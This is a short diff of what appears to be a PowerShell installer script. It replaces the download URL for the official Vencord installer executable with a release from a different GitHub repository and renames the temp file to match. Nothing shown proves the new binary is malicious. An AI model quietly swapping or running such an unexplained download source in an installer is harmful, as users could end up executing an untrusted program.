@@ -1,6 +1,6 @@
-$link = "https://github.com/Vencord/Installer/releases/latest/download/VencordInstallerCli.exe"
+$link = "https://github.com/o9ll/nun/releases/latest/download/NunInstallerCli.exe"
 
-$outfile = "$env:TEMP\VencordInstallerCli.exe"
+$outfile = "$env:TEMP\NunInstallerCli.exe"
 
 Write-Output "Downloading installer to $outfile"
 
